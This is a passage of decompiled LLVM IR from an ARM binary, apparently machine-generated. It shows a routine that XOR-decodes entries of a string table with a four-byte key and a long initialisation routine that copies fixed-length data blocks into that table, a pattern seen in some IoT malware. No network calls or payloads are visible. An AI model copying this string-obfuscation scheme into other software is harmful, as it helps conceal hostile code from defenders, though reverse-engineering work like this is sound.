  br i1 %v8_f098, label %dec_label_pc_f04c.dec_label_pc_f04c_crit_edge, label %dec_label_pc_f09c.loopexit

dec_label_pc_f04c.dec_label_pc_f04c_crit_edge:    ; preds = %dec_label_pc_f04c
  %v0_f054.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_f04c

dec_label_pc_f09c.loopexit:                       ; preds = %dec_label_pc_f04c
  %v2_f09c.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_f09c

dec_label_pc_f09c:                                ; preds = %dec_label_pc_f09c.loopexit, %dec_label_pc_f00c
  %v2_f09c = phi i32 [ %v2_f09c.pre, %dec_label_pc_f09c.loopexit ], [ %v3_f030, %dec_label_pc_f00c ]
  store i32 %v2_f09c, i32* @r4, align 4
  ret i32 %v2_f018

; uselistorder directives
  uselistorder i32 %v1_f090, { 1, 2, 0 }
  uselistorder i32 %v1_f040, { 1, 0 }
  uselistorder i32 %v3_f02c, { 1, 0 }
  uselistorder i32 %v2_f01c, { 3, 0, 1, 2 }
  uselistorder i32 %v2_f018, { 1, 0 }
  uselistorder i32 %v3_f014, { 1, 0 }
}

define i32 @function_f0ac(i32 %arg1) local_unnamed_addr {
dec_label_pc_f0ac:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_f0b4 = mul i32 %arg1, 8
  %v2_f0b8 = add i32 %v3_f0b4, ptrtoint (i32* @global_var_2061c.163 to i32)
  %v2_f0bc = load i32, i32* inttoptr (i32 123896 to i32*), align 8
  %v1_f0c0 = add i32 %v3_f0b4, add (i32 ptrtoint (i32* @global_var_2061c.163 to i32), i32 4)
  %v2_f0c0 = inttoptr i32 %v1_f0c0 to i16*
  %v3_f0c0 = load i16, i16* %v2_f0c0, align 4
  %v3_f0c4 = udiv i32 %v2_f0bc, 256
  store i32 %v3_f0c4, i32* @r2, align 4
  %v2_f0c8 = icmp eq i16 %v3_f0c0, 0
  %v3_f0cc = udiv i32 %v2_f0bc, 65536
  store i32 %v3_f0cc, i32* @r3, align 4
  %v3_f0d0 = load i32, i32* @r4, align 4
  store i32 %v3_f0d0, i32* %stack_var_-16, align 4
  %v1_f0d4 = urem i32 %v3_f0c4, 256
  store i32 %v1_f0d4, i32* %r6.global-to-local, align 4
  %v1_f0d8 = urem i32 %v3_f0cc, 256
  store i32 %v1_f0d8, i32* %r5.global-to-local, align 4
  %v3_f0dc = udiv i32 %v2_f0bc, 16777216
  store i32 %v3_f0dc, i32* %r4.global-to-local, align 4
  %v1_f0e0 = urem i32 %v2_f0bc, 256
  store i32 %v1_f0e0, i32* %lr.global-to-local, align 4
  br i1 %v2_f0c8, label %dec_label_pc_f13c, label %dec_label_pc_f0e8

dec_label_pc_f0e8:                                ; preds = %dec_label_pc_f0ac
  store i32 0, i32* %ip.global-to-local, align 4
  %v1_f0ec = inttoptr i32 %v2_f0b8 to i32*
  br label %dec_label_pc_f0ec

dec_label_pc_f0ec:                                ; preds = %dec_label_pc_f0ec.dec_label_pc_f0ec_crit_edge, %dec_label_pc_f0e8
  %v0_f0f4 = phi i32 [ %v0_f0f4.pre, %dec_label_pc_f0ec.dec_label_pc_f0ec_crit_edge ], [ %v1_f0e0, %dec_label_pc_f0e8 ]
  %v2_f0f8 = phi i32 [ %v1_f130, %dec_label_pc_f0ec.dec_label_pc_f0ec_crit_edge ], [ 0, %dec_label_pc_f0e8 ]
  %v2_f0ec = load i32, i32* %v1_f0ec, align 4
  %v2_f0f0 = add i32 %v2_f0ec, %v2_f0f8
  %v3_f0f0 = inttoptr i32 %v2_f0f0 to i8*
  %v4_f0f0 = load i8, i8* %v3_f0f0, align 1
  %v6_f0f0 = zext i8 %v4_f0f0 to i32
  %v2_f0f4 = xor i32 %v6_f0f0, %v0_f0f4
  %v1_f0f8 = trunc i32 %v2_f0f4 to i8
  store i8 %v1_f0f8, i8* %v3_f0f0, align 1
  %v2_f0fc = load i32, i32* %v1_f0ec, align 4
  %v0_f100 = load i32, i32* %ip.global-to-local, align 4
  %v2_f100 = add i32 %v0_f100, %v2_f0fc
  %v3_f100 = inttoptr i32 %v2_f100 to i8*
  %v4_f100 = load i8, i8* %v3_f100, align 1
  %v6_f100 = zext i8 %v4_f100 to i32
  %v0_f104 = load i32, i32* %r6.global-to-local, align 4
  %v2_f104 = xor i32 %v0_f104, %v6_f100
  %v1_f108 = trunc i32 %v2_f104 to i8
  store i8 %v1_f108, i8* %v3_f100, align 1
  %v2_f10c = load i32, i32* %v1_f0ec, align 4
  %v0_f110 = load i32, i32* %ip.global-to-local, align 4
  %v2_f110 = add i32 %v0_f110, %v2_f10c
  %v3_f110 = inttoptr i32 %v2_f110 to i8*
  %v4_f110 = load i8, i8* %v3_f110, align 1
  %v6_f110 = zext i8 %v4_f110 to i32
  %v0_f114 = load i32, i32* %r5.global-to-local, align 4
  %v2_f114 = xor i32 %v0_f114, %v6_f110
  %v1_f118 = trunc i32 %v2_f114 to i8
  store i8 %v1_f118, i8* %v3_f110, align 1
  %v2_f11c = load i32, i32* %v1_f0ec, align 4
  %v0_f120 = load i32, i32* %ip.global-to-local, align 4
  %v2_f120 = add i32 %v0_f120, %v2_f11c
  %v3_f120 = inttoptr i32 %v2_f120 to i8*
  %v4_f120 = load i8, i8* %v3_f120, align 1
  %v6_f120 = zext i8 %v4_f120 to i32
  %v0_f124 = load i32, i32* %r4.global-to-local, align 4
  %v2_f124 = xor i32 %v0_f124, %v6_f120
  store i32 %v2_f124, i32* @r3, align 4
  %v1_f128 = trunc i32 %v2_f124 to i8
  store i8 %v1_f128, i8* %v3_f120, align 1
  %v3_f12c = load i16, i16* %v2_f0c0, align 4
  %v4_f12c = zext i16 %v3_f12c to i32
  store i32 %v4_f12c, i32* @r2, align 4
  %v0_f130 = load i32, i32* %ip.global-to-local, align 4
  %v1_f130 = add i32 %v0_f130, 1
  store i32 %v1_f130, i32* %ip.global-to-local, align 4
  %v8_f138 = icmp sgt i32 %v4_f12c, %v1_f130
  br i1 %v8_f138, label %dec_label_pc_f0ec.dec_label_pc_f0ec_crit_edge, label %dec_label_pc_f13c.loopexit

dec_label_pc_f0ec.dec_label_pc_f0ec_crit_edge:    ; preds = %dec_label_pc_f0ec
  %v0_f0f4.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_f0ec

dec_label_pc_f13c.loopexit:                       ; preds = %dec_label_pc_f0ec
  %v2_f13c.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_f13c

dec_label_pc_f13c:                                ; preds = %dec_label_pc_f13c.loopexit, %dec_label_pc_f0ac
  %v2_f13c = phi i32 [ %v2_f13c.pre, %dec_label_pc_f13c.loopexit ], [ %v3_f0d0, %dec_label_pc_f0ac ]
  store i32 %v2_f13c, i32* @r4, align 4
  ret i32 %v2_f0b8

; uselistorder directives
  uselistorder i32 %v1_f130, { 1, 2, 0 }
  uselistorder i32 %v1_f0e0, { 1, 0 }
  uselistorder i32 %v3_f0cc, { 1, 0 }
  uselistorder i32 %v3_f0c4, { 1, 0 }
  uselistorder i32 %v2_f0bc, { 3, 0, 1, 2 }
  uselistorder i32 %v2_f0b8, { 1, 0 }
  uselistorder i32 %v3_f0b4, { 1, 0 }
}

define i32 @function_f148(i32* %arg1) local_unnamed_addr {
dec_label_pc_f148:
  %r5.global-to-local = alloca i32, align 4
  %v0_f148 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_f148, label %bb, label %dec_label_pc_f148._crit_edge

dec_label_pc_f148._crit_edge:                     ; preds = %dec_label_pc_f148
  br label %bb13

bb:                                               ; preds = %dec_label_pc_f148
  %v1_f148 = load i32, i32* @lr, align 4
  store i32 %v1_f148, i32* %arg1, align 4
  br label %bb13

bb13:                                             ; preds = %dec_label_pc_f148._crit_edge, %bb
  %v6_f14c = load i32, i32* @r5, align 4
  store i32 15, i32* @r0, align 4
  %v0_f158 = call i32 @function_11038()
  store i32 ptrtoint (i32* @global_var_15a9c.169 to i32), i32* @r8, align 4
  store i32 ptrtoint (i32* @global_var_2061c.163 to i32), i32* @r4, align 4
  store i32 15, i32* @r6, align 4
  store i32 %v0_f158, i32* @r5, align 4
  %v3_f174 = call i32 @function_f9ac(i32 %v0_f158, i32 ptrtoint (i32* @global_var_15a9c.169 to i32), i32 15)
  store i32 2, i32* @r0, align 4
  %v0_f17c = load i32, i32* @r5, align 4
  store i32 %v0_f17c, i32* @global_var_20634.171, align 4
  %v0_f180 = load i32, i32* @r6, align 4
  %v1_f180 = trunc i32 %v0_f180 to i16
  store i16 %v1_f180, i16* bitcast (i32* @global_var_20638.172 to i16*), align 4
  %v0_f184 = call i32 @function_11038()
  store i32 2, i32* @r5, align 4
  store i32 %v0_f184, i32* @r7, align 4
  %v4_f198 = call i32 @function_f9ac(i32 %v0_f184, i32 ptrtoint ([3 x i8]* @global_var_15aac.174 to i32), i32 2)
  %v0_f19c = load i32, i32* @r6, align 4
  store i32 %v0_f19c, i32* @r0, align 4
  %v0_f1a0 = load i32, i32* @r7, align 4
  store i32 %v0_f1a0, i32* @global_var_2063c.175, align 4
  %v0_f1a4 = load i32, i32* @r5, align 4
  %v1_f1a4 = trunc i32 %v0_f1a4 to i16
  store i16 %v1_f1a4, i16* bitcast (i32* @global_var_20640.176 to i16*), align 4
  %v0_f1a8 = call i32 @function_11038()
  %v0_f1ac = load i32, i32* @r8, align 4
  %v0_f1b0 = load i32, i32* @r6, align 4
  store i32 %v0_f1a8, i32* @r7, align 4
  %v3_f1b8 = call i32 @function_f9ac(i32 %v0_f1a8, i32 %v0_f1ac, i32 %v0_f1b0)
  %v0_f1bc = load i32, i32* @r5, align 4
  store i32 %v0_f1bc, i32* @r0, align 4
  %v0_f1c0 = load i32, i32* @r7, align 4
  store i32 %v0_f1c0, i32* @global_var_206ac.177, align 4
  %v0_f1c4 = load i32, i32* @r6, align 4
  %v1_f1c4 = trunc i32 %v0_f1c4 to i16
  store i16 %v1_f1c4, i16* bitcast (i32* @global_var_206b0.178 to i16*), align 4
  %v0_f1c8 = call i32 @function_11038()
  %v0_f1cc = load i32, i32* @r5, align 4
  store i32 %v0_f1c8, i32* @r6, align 4
  %v3_f1d8 = call i32 @function_f9ac(i32 %v0_f1c8, i32 ptrtoint (i32* @global_var_15ab0.180 to i32), i32 %v0_f1cc)
  store i32 10, i32* @r0, align 4
  %v0_f1e0 = load i32, i32* @r6, align 4
  store i32 %v0_f1e0, i32* @global_var_206b4.181, align 4
  %v0_f1e4 = load i32, i32* @r5, align 4
  %v1_f1e4 = trunc i32 %v0_f1e4 to i16
  store i16 %v1_f1e4, i16* bitcast (i32* @global_var_206b8.182 to i16*), align 4
  %v0_f1e8 = call i32 @function_11038()
  store i32 10, i32* @r7, align 4
  store i32 %v0_f1e8, i32* @r5, align 4
  %v3_f1fc = call i32 @function_f9ac(i32 %v0_f1e8, i32 ptrtoint (i32* @global_var_15ab4.184 to i32), i32 10)
  store i32 29, i32* @r0, align 4
  %v0_f204 = load i32, i32* @r5, align 4
  store i32 %v0_f204, i32* @global_var_2062c.185, align 4
  %v0_f208 = load i32, i32* @r7, align 4
  %v1_f208 = trunc i32 %v0_f208 to i16
  store i16 %v1_f208, i16* bitcast (i32* @global_var_20630.186 to i16*), align 4
  %v0_f20c = call i32 @function_11038()
  store i32 %v0_f20c, i32* @r5, align 4
  %v3_f21c = call i32 @function_f9ac(i32 %v0_f20c, i32 ptrtoint (i32* @global_var_15cf0.188 to i32), i32 29)
  store i32 7, i32* @r0, align 4
  %v0_f228 = load i32, i32* @r5, align 4
  store i32 %v0_f228, i32* @global_var_20644.189, align 4
  store i16 29, i16* bitcast (i32* @global_var_20648.190 to i16*), align 4
  %v0_f230 = call i32 @function_11038()
  store i32 7, i32* @r6, align 4
  store i32 %v0_f230, i32* @r5, align 4
  %v3_f244 = call i32 @function_f9ac(i32 %v0_f230, i32 ptrtoint (i32* @global_var_15ac0.192 to i32), i32 7)
  store i32 5, i32* @r0, align 4
  %v0_f24c = load i32, i32* @r5, align 4
  store i32 %v0_f24c, i32* @global_var_2064c.193, align 4
  %v0_f250 = load i32, i32* @r6, align 4
  %v1_f250 = trunc i32 %v0_f250 to i16
  store i16 %v1_f250, i16* bitcast (i32* @global_var_20650.194 to i16*), align 4
  %v0_f254 = call i32 @function_11038()
  store i32 %v0_f254, i32* @r5, align 4
  %v3_f264 = call i32 @function_f9ac(i32 %v0_f254, i32 ptrtoint (i32* @global_var_15ac8.196 to i32), i32 5)
  store i32 11, i32* @r0, align 4
  store i16 5, i16* bitcast (i32* @global_var_20658.197 to i16*), align 4
  %v0_f274 = load i32, i32* @r5, align 4
  store i32 %v0_f274, i32* @global_var_20654.198, align 4
  %v0_f278 = call i32 @function_11038()
  store i32 11, i32* @fp, align 4
  store i32 %v0_f278, i32* @r5, align 4
  %v3_f28c = call i32 @function_f9ac(i32 %v0_f278, i32 ptrtoint (i32* @global_var_15ad0.200 to i32), i32 11)
  store i32 4, i32* @r0, align 4
  %v0_f294 = load i32, i32* @r5, align 4
  store i32 %v0_f294, i32* @global_var_2065c.201, align 4
  %v0_f298 = load i32, i32* @fp, align 4
  %v1_f298 = trunc i32 %v0_f298 to i16
  store i16 %v1_f298, i16* bitcast (i32* @global_var_20660.202 to i16*), align 4
  %v0_f29c = call i32 @function_11038()
  store i32 %v0_f29c, i32* @r5, align 4
  %v3_f2ac = call i32 @function_f9ac(i32 %v0_f29c, i32 ptrtoint (i32* @global_var_15adc.204 to i32), i32 4)
  %v0_f2b4 = load i32, i32* @r6, align 4
  store i32 %v0_f2b4, i32* @r0, align 4
  %v0_f2b8 = load i32, i32* @r5, align 4
  store i32 %v0_f2b8, i32* @global_var_20664.205, align 4
  store i16 4, i16* bitcast (i32* @global_var_20668.206 to i16*), align 4
  %v0_f2c0 = call i32 @function_11038()
  %v0_f2c4 = load i32, i32* @r6, align 4
  store i32 %v0_f2c0, i32* @r5, align 4
  %v3_f2d0 = call i32 @function_f9ac(i32 %v0_f2c0, i32 ptrtoint (i32* @global_var_15ae4.208 to i32), i32 %v0_f2c4)
  store i32 8, i32* @r0, align 4
  %v0_f2d8 = load i32, i32* @r5, align 4
  store i32 %v0_f2d8, i32* @global_var_2066c.209, align 4
  %v0_f2dc = load i32, i32* @r6, align 4
  %v1_f2dc = trunc i32 %v0_f2dc to i16
  store i16 %v1_f2dc, i16* bitcast (i32* @global_var_20670.210 to i16*), align 4
  %v0_f2e0 = call i32 @function_11038()
  store i32 8, i32* @sl, align 4
  store i32 %v0_f2e0, i32* @r5, align 4
  %v3_f2f4 = call i32 @function_f9ac(i32 %v0_f2e0, i32 ptrtoint (i32* @global_var_15aec.212 to i32), i32 8)
  store i32 13, i32* @r0, align 4
  %v0_f2fc = load i32, i32* @r5, align 4
  store i32 %v0_f2fc, i32* @global_var_20674.213, align 4
  %v0_f300 = load i32, i32* @sl, align 4
  %v1_f300 = trunc i32 %v0_f300 to i16
  store i16 %v1_f300, i16* bitcast (i32* @global_var_20678.214 to i16*), align 4
  %v0_f304 = call i32 @function_11038()
  store i32 %v0_f304, i32* @r5, align 4
  %v3_f314 = call i32 @function_f9ac(i32 %v0_f304, i32 ptrtoint (i32* @global_var_15af8.216 to i32), i32 13)
  %v0_f31c = load i32, i32* @r7, align 4
  store i32 %v0_f31c, i32* @r0, align 4
  store i16 13, i16* bitcast (i32* @global_var_20680.217 to i16*), align 4
  %v0_f324 = load i32, i32* @r5, align 4
  store i32 %v0_f324, i32* @global_var_2067c.218, align 4
  %v0_f328 = call i32 @function_11038()
  %v0_f330 = load i32, i32* @r7, align 4
  store i32 %v0_f328, i32* @r5, align 4
  %v4_f338 = call i32 @function_f9ac(i32 %v0_f328, i32 ptrtoint ([11 x i8]* @global_var_15b08.220 to i32), i32 %v0_f330)
  %v0_f33c = load i32, i32* @r7, align 4
  store i32 %v0_f33c, i32* @r0, align 4
  %v0_f340 = load i32, i32* @r5, align 4
  store i32 %v0_f340, i32* @global_var_20684.221, align 4
  %v1_f344 = trunc i32 %v0_f33c to i16
  store i16 %v1_f344, i16* bitcast (i32* @global_var_20688.222 to i16*), align 4
  %v0_f348 = call i32 @function_11038()
  %v0_f350 = load i32, i32* @r7, align 4
  store i32 %v0_f348, i32* @r5, align 4
  %v4_f358 = call i32 @function_f9ac(i32 %v0_f348, i32 ptrtoint ([11 x i8]* @global_var_15b14.224 to i32), i32 %v0_f350)
  store i32 33, i32* @r0, align 4
  %v0_f360 = load i32, i32* @r5, align 4
  store i32 %v0_f360, i32* @global_var_2068c.225, align 4
  %v0_f364 = load i32, i32* @r7, align 4
  %v1_f364 = trunc i32 %v0_f364 to i16
  store i16 %v1_f364, i16* bitcast (i32* @global_var_20690.226 to i16*), align 4
  %v0_f368 = call i32 @function_11038()
  store i32 %v0_f368, i32* @r5, align 4
  %v3_f378 = call i32 @function_f9ac(i32 %v0_f368, i32 ptrtoint (i32* @global_var_15b20.228 to i32), i32 33)
  %v0_f380 = load i32, i32* @sl, align 4
  store i32 %v0_f380, i32* @r0, align 4
  %v0_f384 = load i32, i32* @r5, align 4
  store i32 %v0_f384, i32* @global_var_20694.229, align 4
  store i16 33, i16* bitcast (i32* @global_var_20698.230 to i16*), align 4
  %v0_f38c = call i32 @function_11038()
  %v0_f394 = load i32, i32* @sl, align 4
  store i32 %v0_f38c, i32* @r5, align 4
  %v3_f39c = call i32 @function_f9ac(i32 %v0_f38c, i32 ptrtoint (i32* @global_var_15b44.232 to i32), i32 %v0_f394)
  %v0_f3a0 = load i32, i32* @fp, align 4
  store i32 %v0_f3a0, i32* @r0, align 4
  %v0_f3a4 = load i32, i32* @r5, align 4
  store i32 %v0_f3a4, i32* @global_var_2069c.233, align 4
  %v0_f3a8 = load i32, i32* @sl, align 4
  %v1_f3a8 = trunc i32 %v0_f3a8 to i16
  store i16 %v1_f3a8, i16* bitcast (i32* @global_var_206a0.234 to i16*), align 4
  %v0_f3ac = call i32 @function_11038()
  %v0_f3b4 = load i32, i32* @fp, align 4
  store i32 %v0_f3ac, i32* @r5, align 4
  %v4_f3bc = call i32 @function_f9ac(i32 %v0_f3ac, i32 ptrtoint ([12 x i8]* @global_var_15b50.236 to i32), i32 %v0_f3b4)
  store i32 6, i32* @r0, align 4
  %v0_f3c4 = load i32, i32* @r5, align 4
  store i32 %v0_f3c4, i32* @global_var_206a4.237, align 4
  %v0_f3c8 = load i32, i32* @fp, align 4
  %v1_f3c8 = trunc i32 %v0_f3c8 to i16
  store i16 %v1_f3c8, i16* bitcast (i32* @global_var_206a8.238 to i16*), align 4
  %v0_f3cc = call i32 @function_11038()
  store i32 %v0_f3cc, i32* @r5, align 4
  %v3_f3dc = call i32 @function_f9ac(i32 %v0_f3cc, i32 ptrtoint (i32* @global_var_15b5c.240 to i32), i32 6)
  %v0_f3e4 = load i32, i32* @r6, align 4
  store i32 %v0_f3e4, i32* @r0, align 4
  store i16 6, i16* bitcast (i32* @global_var_206c0.241 to i16*), align 4
  %v0_f3ec = load i32, i32* @r5, align 4
  store i32 %v0_f3ec, i32* @global_var_206bc.242, align 4
  %v0_f3f0 = call i32 @function_11038()
  %v0_f3f4 = load i32, i32* @r6, align 4
  store i32 %v0_f3f0, i32* @r5, align 4
  %v3_f400 = call i32 @function_f9ac(i32 %v0_f3f0, i32 ptrtoint (i32* @global_var_15d10.244 to i32), i32 %v0_f3f4)
  %v0_f404 = load i32, i32* @r6, align 4
  store i32 %v0_f404, i32* @r0, align 4
  %v0_f408 = load i32, i32* @r5, align 4
  store i32 %v0_f408, i32* @global_var_206c4.245, align 4
  %v1_f40c = trunc i32 %v0_f404 to i16
  store i16 %v1_f40c, i16* bitcast (i32* @global_var_206c8.246 to i16*), align 4
  %v0_f410 = call i32 @function_11038()
  %v0_f414 = load i32, i32* @r6, align 4
  store i32 %v0_f410, i32* @r5, align 4
  %v3_f420 = call i32 @function_f9ac(i32 %v0_f410, i32 ptrtoint (i32* @global_var_15b64.248 to i32), i32 %v0_f414)
  store i32 3, i32* @r0, align 4
  %v0_f428 = load i32, i32* @r5, align 4
  store i32 %v0_f428, i32* @global_var_206cc.249, align 4
  %v0_f42c = load i32, i32* @r6, align 4
  %v1_f42c = trunc i32 %v0_f42c to i16
  store i16 %v1_f42c, i16* bitcast (i32* @global_var_206d0.250 to i16*), align 4
  %v0_f430 = call i32 @function_11038()
  store i32 %v0_f430, i32* @r5, align 4
  %v3_f440 = call i32 @function_f9ac(i32 %v0_f430, i32 ptrtoint (i32* @global_var_15b6c.252 to i32), i32 3)
  store i32 19, i32* @r0, align 4
  %v0_f44c = load i32, i32* @r5, align 4
  store i32 %v0_f44c, i32* @global_var_206d4.253, align 4
  store i16 3, i16* bitcast (i32* @global_var_206d8.254 to i16*), align 4
  %v0_f454 = call i32 @function_11038()
  store i32 %v0_f454, i32* @r5, align 4
  %v3_f464 = call i32 @function_f9ac(i32 %v0_f454, i32 ptrtoint (i32* @global_var_15d18.256 to i32), i32 19)
  store i32 24, i32* @r0, align 4
  store i16 19, i16* bitcast (i32* @global_var_206e0.257 to i16*), align 4
  %v0_f474 = load i32, i32* @r5, align 4
  store i32 %v0_f474, i32* @global_var_206dc.258, align 4
  %v0_f478 = call i32 @function_11038()
  store i32 %v0_f478, i32* @r5, align 4
  %v3_f488 = call i32 @function_f9ac(i32 %v0_f478, i32 ptrtoint (i32* @global_var_15b70.260 to i32), i32 24)
  store i32 9, i32* @r0, align 4
  %v0_f494 = load i32, i32* @r5, align 4
  store i32 %v0_f494, i32* @global_var_206e4.261, align 4
  store i16 24, i16* bitcast (i32* @global_var_206e8.262 to i16*), align 4
  %v0_f49c = call i32 @function_11038()
  store i32 %v0_f49c, i32* @r5, align 4
  store i32 9, i32* @r8, align 4
  %v3_f4b0 = call i32 @function_f9ac(i32 %v0_f49c, i32 ptrtoint (i32* @global_var_15b8c.264 to i32), i32 9)
  store i32 16, i32* @r0, align 4
  %v0_f4b8 = load i32, i32* @r5, align 4
  store i32 %v0_f4b8, i32* @global_var_206ec.265, align 4
  %v0_f4bc = load i32, i32* @r8, align 4
  %v1_f4bc = trunc i32 %v0_f4bc to i16
  store i16 %v1_f4bc, i16* bitcast (i32* @global_var_206f0.266 to i16*), align 4
  %v0_f4c0 = call i32 @function_11038()
  store i32 %v0_f4c0, i32* @r5, align 4
  store i32 16, i32* @sb, align 4
  %v3_f4d4 = call i32 @function_f9ac(i32 %v0_f4c0, i32 ptrtoint (i32* @global_var_15d2c.268 to i32), i32 16)
  store i32 22, i32* @r0, align 4
  %v0_f4dc = load i32, i32* @r5, align 4
  store i32 %v0_f4dc, i32* @global_var_206f4.269, align 4
  %v0_f4e0 = load i32, i32* @sb, align 4
  %v1_f4e0 = trunc i32 %v0_f4e0 to i16
  store i16 %v1_f4e0, i16* bitcast (i32* @global_var_206f8.270 to i16*), align 4
  %v0_f4e4 = call i32 @function_11038()
  store i32 %v0_f4e4, i32* @r5, align 4
  %v3_f4f4 = call i32 @function_f9ac(i32 %v0_f4e4, i32 ptrtoint (i32* @global_var_15d40.272 to i32), i32 22)
  store i32 21, i32* @r0, align 4
  store i16 22, i16* bitcast (i32* @global_var_20700.273 to i16*), align 4
  %v0_f504 = load i32, i32* @r5, align 4
  store i32 %v0_f504, i32* @global_var_206fc.274, align 4
  %v0_f508 = call i32 @function_11038()
  store i32 %v0_f508, i32* @r5, align 4
  %v3_f518 = call i32 @function_f9ac(i32 %v0_f508, i32 ptrtoint (i32* @global_var_15b98.276 to i32), i32 21)
  store i32 17, i32* @r0, align 4
  %v0_f524 = load i32, i32* @r5, align 4
  store i32 %v0_f524, i32* @global_var_20704.277, align 4
  store i16 21, i16* bitcast (i32* @global_var_20708.278 to i16*), align 4
  %v0_f52c = call i32 @function_11038()
  store i32 %v0_f52c, i32* @r5, align 4
  %v3_f53c = call i32 @function_f9ac(i32 %v0_f52c, i32 ptrtoint (i32* @global_var_15bb0.280 to i32), i32 17)
  store i32 12, i32* @r0, align 4
  store i16 17, i16* bitcast (i32* @global_var_20710.281 to i16*), align 4
  %v0_f54c = load i32, i32* @r5, align 4
  store i32 %v0_f54c, i32* @global_var_2070c.282, align 4
  %v0_f550 = call i32 @function_11038()
  %v0_f55c = load i32, i32* @r6, align 4
  %v1_f55c = add i32 %v0_f55c, 5
  store i32 %v1_f55c, i32* @r6, align 4
  store i32 %v0_f550, i32* @r5, align 4
  %v3_f564 = call i32 @function_f9ac(i32 %v0_f550, i32 ptrtoint (i32* @global_var_15bc4.284 to i32), i32 12)
  store i32 23, i32* @r0, align 4
  %v0_f56c = load i32, i32* @r5, align 4
  store i32 %v0_f56c, i32* @global_var_20714.285, align 4
  %v0_f570 = load i32, i32* @r6, align 4
  %v1_f570 = trunc i32 %v0_f570 to i16
  store i16 %v1_f570, i16* bitcast (i32* @global_var_20718.286 to i16*), align 4
  %v0_f574 = call i32 @function_11038()
  store i32 %v0_f574, i32* @r5, align 4
  %v3_f584 = call i32 @function_f9ac(i32 %v0_f574, i32 ptrtoint (i32* @global_var_15bd4.288 to i32), i32 23)
  store i32 83, i32* @r0, align 4
  %v2_f594 = load i32, i32* @r4, align 4
  %v4_f594 = add i32 %v2_f594, 260
  %v5_f594 = inttoptr i32 %v4_f594 to i16*
  store i16 23, i16* %v5_f594, align 2
  %v0_f598 = load i32, i32* @r5, align 4
  store i32 %v0_f598, i32* @global_var_2071c.289, align 4
  %v0_f59c = call i32 @function_11038()
  store i32 %v0_f59c, i32* @r5, align 4
  %v3_f5ac = call i32 @function_f9ac(i32 %v0_f59c, i32 ptrtoint (i32* @global_var_15d58.291 to i32), i32 83)
  store i32 32, i32* @r0, align 4
  %v2_f5bc = load i32, i32* @r4, align 4
  %v4_f5bc = add i32 %v2_f5bc, 268
  %v5_f5bc = inttoptr i32 %v4_f5bc to i16*
  store i16 83, i16* %v5_f5bc, align 2
  %v0_f5c0 = load i32, i32* @r5, align 4
  store i32 %v0_f5c0, i32* @global_var_20724.292, align 4
  %v0_f5c4 = call i32 @function_11038()
  store i32 %v0_f5c4, i32* @r5, align 4
  %v3_f5d4 = call i32 @function_f9ac(i32 %v0_f5c4, i32 ptrtoint (i32* @global_var_15bec.294 to i32), i32 32)
  store i32 48, i32* @r0, align 4
  %v2_f5e4 = load i32, i32* @r4, align 4
  %v4_f5e4 = add i32 %v2_f5e4, 276
  %v5_f5e4 = inttoptr i32 %v4_f5e4 to i16*
  store i16 32, i16* %v5_f5e4, align 2
  %v0_f5e8 = load i32, i32* @r5, align 4
  store i32 %v0_f5e8, i32* @global_var_2072c.295, align 4
  %v0_f5ec = call i32 @function_11038()
  store i32 %v0_f5ec, i32* @r5, align 4
  %v3_f5fc = call i32 @function_f9ac(i32 %v0_f5ec, i32 ptrtoint (i32* @global_var_15c10.297 to i32), i32 48)
  %v0_f608 = load i32, i32* @r6, align 4
  store i32 %v0_f608, i32* @r0, align 4
  %v2_f60c = load i32, i32* @r4, align 4
  %v4_f60c = add i32 %v2_f60c, 284
  %v5_f60c = inttoptr i32 %v4_f60c to i16*
  store i16 48, i16* %v5_f60c, align 2
  %v0_f610 = load i32, i32* @r5, align 4
  store i32 %v0_f610, i32* @global_var_20734.298, align 4
  %v0_f614 = call i32 @function_11038()
  %v0_f618 = load i32, i32* @r6, align 4
  store i32 %v0_f614, i32* @r5, align 4
  %v3_f624 = call i32 @function_f9ac(i32 %v0_f614, i32 ptrtoint (i32* @global_var_15c44.300 to i32), i32 %v0_f618)
  %v0_f62c = load i32, i32* @r8, align 4
  store i32 %v0_f62c, i32* @r0, align 4
  %v0_f630 = load i32, i32* @r6, align 4
  %v1_f630 = trunc i32 %v0_f630 to i16
  %v2_f630 = load i32, i32* @r4, align 4
  %v4_f630 = add i32 %v2_f630, 292
  %v5_f630 = inttoptr i32 %v4_f630 to i16*
  store i16 %v1_f630, i16* %v5_f630, align 2
  %v0_f634 = load i32, i32* @r5, align 4
  store i32 %v0_f634, i32* @global_var_2073c.301, align 4
  %v0_f638 = call i32 @function_11038()
  %v0_f640 = load i32, i32* @r8, align 4
  store i32 %v0_f638, i32* @r5, align 4
  %v3_f648 = call i32 @function_f9ac(i32 %v0_f638, i32 ptrtoint (i32* @global_var_15c54.303 to i32), i32 %v0_f640)
  %v0_f650 = load i32, i32* @r7, align 4
  store i32 %v0_f650, i32* @r0, align 4
  %v0_f654 = load i32, i32* @r8, align 4
  %v1_f654 = trunc i32 %v0_f654 to i16
  %v2_f654 = load i32, i32* @r4, align 4
  %v4_f654 = add i32 %v2_f654, 300
  %v5_f654 = inttoptr i32 %v4_f654 to i16*
  store i16 %v1_f654, i16* %v5_f654, align 2
  %v0_f658 = load i32, i32* @r5, align 4
  store i32 %v0_f658, i32* @global_var_20744.304, align 4
  %v0_f65c = call i32 @function_11038()
  %v0_f664 = load i32, i32* @r7, align 4
  store i32 %v0_f65c, i32* @r5, align 4
  %v3_f66c = call i32 @function_f9ac(i32 %v0_f65c, i32 ptrtoint (i32* @global_var_15c60.306 to i32), i32 %v0_f664)
  %v0_f674 = load i32, i32* @r6, align 4
  store i32 %v0_f674, i32* @r0, align 4
  %v0_f678 = load i32, i32* @r7, align 4
  %v1_f678 = trunc i32 %v0_f678 to i16
  %v2_f678 = load i32, i32* @r4, align 4
  %v4_f678 = add i32 %v2_f678, 308
  %v5_f678 = inttoptr i32 %v4_f678 to i16*
  store i16 %v1_f678, i16* %v5_f678, align 2
  %v0_f67c = load i32, i32* @r5, align 4
  store i32 %v0_f67c, i32* @global_var_2074c.307, align 4
  %v0_f680 = call i32 @function_11038()
